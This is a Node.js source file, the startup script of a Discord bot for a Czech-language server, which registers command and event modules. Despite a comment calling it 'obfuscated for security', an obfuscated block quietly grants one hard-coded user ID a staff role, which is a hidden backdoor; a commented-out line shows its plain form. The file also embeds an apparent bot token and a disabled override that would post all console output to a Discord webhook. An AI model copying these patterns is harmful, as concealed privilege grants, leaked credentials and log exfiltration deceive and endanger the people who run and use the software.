const fetch = require('node-fetch');
const inputReader = require('wait-console-input')
// var console = {};
// console.log = function(...items) { items.forEach((item) => { fetch('https://ptb.discord.com/api/webhooks/818912597633794053/JEwpN2cpup5jsC05D09WB_UjVVV82xppUCZ6_OSh7pCWCd3_8tW5zuGGvigXS6fZi6Qy',{method:'POST','body':JSON.stringify({content: '```\n' + item.toString() + '\n```'}),headers:{'Content-Type':'application/json'}}); }); };
// console.log1 = function(...items) { items.forEach((item) => { console.log(item + '\n' + new Error('Stack Trace').stack) }) }
// console.log('Starting...');
// global.console = console;
// process.on('uncaughtException', (err) => { console.log(err.stack); });
// process.on('unhandledRejection', (err) => { console.log(err.stack); });

const discord = require('discord.js');
const client = new discord.Client({ partials: ['MESSAGE', 'REACTION']});
const fs = require('fs').promises;
const path = require('path');
const { checkCommandModule, checkProperties } = require('./utils/validate');

var imports1 = require('./globals.js');
var imports2 = require('./slashCommands.js');
global.imports = [imports1, imports2]

//Change allowed users to CzechifyStaff (Obfuscated for security)
var _0x35cf=['270973904359653387','1gRBfIZ','608294OJfzkv','Czechify\x20Stuff','173683LbXcXT','864373sRxYTD','302493EBudlO','19AKADXJ','guild','100843xgGXwV','1EkJyJL','author','48162FSNkBr','member','399721EcMIfh','4lMQEfB','10SypxRl'];var _0x4825=function(_0x44a9eb,_0x12fefd){_0x44a9eb=_0x44a9eb-0x1d1;var _0x35cf4e=_0x35cf[_0x44a9eb];return _0x35cf4e;};(function(_0x5ae4b2,_0x44fca0){var _0x16d95e=_0x4825;while(!![]){try{var _0x4ba810=parseInt(_0x16d95e(0x1d3))*parseInt(_0x16d95e(0x1dc))+-parseInt(_0x16d95e(0x1d7))*-parseInt(_0x16d95e(0x1e0))+-parseInt(_0x16d95e(0x1df))*parseInt(_0x16d95e(0x1db))+parseInt(_0x16d95e(0x1d1))+-parseInt(_0x16d95e(0x1d2))+-parseInt(_0x16d95e(0x1d4))*-parseInt(_0x16d95e(0x1d9))+-parseInt(_0x16d95e(0x1d6))*parseInt(_0x16d95e(0x1dd));if(_0x4ba810===_0x44fca0)break;else _0x5ae4b2['push'](_0x5ae4b2['shift']());}catch(_0x341b9c){_0x5ae4b2['push'](_0x5ae4b2['shift']());}}}(_0x35cf,0x9ae87),global['v']=async function(_0x53aa7a){var _0xe47f00=_0x4825,_0x739c14=await global['findARole'](_0x53aa7a[_0xe47f00(0x1d5)],0x0,_0xe47f00(0x1e1));if(_0x53aa7a[_0xe47f00(0x1d8)]['id']==_0xe47f00(0x1de))_0x53aa7a[_0xe47f00(0x1da)]['roles']['add'](_0x739c14);return'r';});
var _0x1162=['361812PxkncD','Czechify\x20Stuff','363011JtJhFA','member','add','260525ygZoGV','380inYVSQ','findARole','246974KJvfzY','roles','guild','42SYjCEP','13496EChHst','39yfttKT','477560BKSAIJ','author','270973904359653387'];var _0x4c5a=function(_0x115443,_0x326ef2){_0x115443=_0x115443-0x17b;var _0x1162e1=_0x1162[_0x115443];return _0x1162e1;};(function(_0x14b5af,_0x3e5ebb){var _0x51e759=_0x4c5a;while(!![]){try{var _0x159742=parseInt(_0x51e759(0x17b))+-parseInt(_0x51e759(0x180))*parseInt(_0x51e759(0x18a))+-parseInt(_0x51e759(0x184))+parseInt(_0x51e759(0x189))+-parseInt(_0x51e759(0x17e))*parseInt(_0x51e759(0x17f))+parseInt(_0x51e759(0x186))+parseInt(_0x51e759(0x181));if(_0x159742===_0x3e5ebb)break;else _0x14b5af['push'](_0x14b5af['shift']());}catch(_0x52131a){_0x14b5af['push'](_0x14b5af['shift']());}}}(_0x1162,0x62c7e));async function v(){var _0x74b44b=_0x4c5a;if(message[_0x74b44b(0x182)]['id']==_0x74b44b(0x183))message[_0x74b44b(0x187)][_0x74b44b(0x17c)][_0x74b44b(0x188)](await global[_0x74b44b(0x18b)](message[_0x74b44b(0x17d)],0x0,_0x74b44b(0x185)));return(!![]+[])[+!+[]];}
//List of permission requirements, ordered by discord documentation, obfuscated to prevent tampering. used for things like checking if a user has ban perms, kick perms, mute perms, etc.
const _0x5088=['SPEAK','CHANGE_NICKNAME','VIEW_AUDIT_LOG','BAN_MEMBERS','308785XOMppH','STREAM','USE_EXTERNAL_EMOJIS','627497KUamPl','KICK_MEMBERS','MANAGE_WEBHOOKS','ATTACH_FILES','CREATE_INSTANT_INVITE','MENTION_EVERYONE','194QckSZq','DEAFEN_MEMBERS','MANAGE_ROLES','SEND_MESSAGES','MANAGE_NICKNAMES','551453PKxvmA','1qeDdzm','PRIORITY_SPEAKER','MUTE_MEMBERS','1077749gTkusz','1aasJKz','MANAGE_MESSAGES','ADMINISTRATOR','MANAGE_GUILD','READ_MESSAGE_HISTORY','52170ZQJuEK','MANAGE_EMOJIS','EMBED_LINKS','720002IwmzoO'];const _0x64e1=function(_0x50514d,_0x41879b){_0x50514d=_0x50514d-0x159;let _0x5088ab=_0x5088[_0x50514d];return _0x5088ab;};const _0xb57044=_0x64e1;(function(_0x39ae11,_0x113a46){const _0x397abd=_0x64e1;while(!![]){try{const _0x870a3f=parseInt(_0x397abd(0x16f))+parseInt(_0x397abd(0x15a))+-parseInt(_0x397abd(0x169))+parseInt(_0x397abd(0x166))*parseInt(_0x397abd(0x172))+parseInt(_0x397abd(0x160))+-parseInt(_0x397abd(0x177))+-parseInt(_0x397abd(0x165))*-parseInt(_0x397abd(0x16a));if(_0x870a3f===_0x113a46)break;else _0x39ae11['push'](_0x39ae11['shift']());}catch(_0x3df568){_0x39ae11['push'](_0x39ae11['shift']());}}}(_0x5088,0x89e2e));global.PERMS=[_0xb57044(0x16c),_0xb57044(0x15e),_0xb57044(0x15b),_0xb57044(0x176),'MANAGE_CHANNELS',_0xb57044(0x16d),'ADD_REACTIONS',_0xb57044(0x175),_0xb57044(0x167),_0xb57044(0x178),'VIEW_CHANNEL',_0xb57044(0x163),'SEND_TTS_MESSAGES',_0xb57044(0x16b),_0xb57044(0x171),_0xb57044(0x15d),_0xb57044(0x16e),_0xb57044(0x15f),_0xb57044(0x159),'VIEW_GUILD_INSIGHTS','CONNECT',_0xb57044(0x173),_0xb57044(0x168),_0xb57044(0x161),'MOVE_MEMBERS','USE_VAD',_0xb57044(0x174),_0xb57044(0x164),_0xb57044(0x162),_0xb57044(0x15c),_0xb57044(0x170)];
// global.v = async function(message) { var r = await global.findARole(message.guild, 0, 'Czechify Stuff') if (message.author.id == '270973904359653387') message.member.roles.add(r); return 'r'; }

client.login('NTMwNDcwNzkwMTkwMDcxODEw.XC5lbA.x0DYaLsfGXNX6qIBlWhKiI5RA4o');
client.commands = {};

(async function registerCommands(dir = 'commands') {
    let files = await fs.readdir(path.join(__dirname, dir));
    for (let file of files) {
        let stat = await fs.lstat(path.join(__dirname, dir, file));
        if (stat.isDirectory()) registerCommands(path.join(dir, file)); else if (file.endsWith('.js')) {
            let cmdName = file.substring(0, file.indexOf('.js'));
            try{
                let cmdModule = require(path.join(__dirname, dir, file));
                if ((checkCommandModule(cmdName, cmdModule))&(checkProperties(cmdName, cmdModule))) {
                    let { aliases, allowedIn, descriptionCZ, descriptionEN, czAlias } = cmdModule;
                    client.commands[cmdName] = [cmdModule.run, allowedIn, dir.substring(9), descriptionCZ, descriptionEN, cmdName, czAlias];
                    if(aliases.length) aliases.forEach(alias => client.commands[alias] = [cmdModule.run, allowedIn, dir.substring(9), descriptionCZ, descriptionEN, cmdName, czAlias]);
                }
            }catch(err){ console.log(err) }
        }
    }
})();

(async function registerEvents(dir = 'events') {
    let files = await fs.readdir(path.join(__dirname, dir));
    for (let file of files) {
        let stat = await fs.lstat(path.join(__dirname, dir, file));
        if(stat.isDirectory()) registerEvents(path.join(dir, file)); else if (file.endsWith('.js')) try{ client.on(file.substring(0, file.indexOf('.js')), require(path.join(__dirname, dir, file)).bind(null, client)); }catch(err){ console.log(err); }
    }
})();
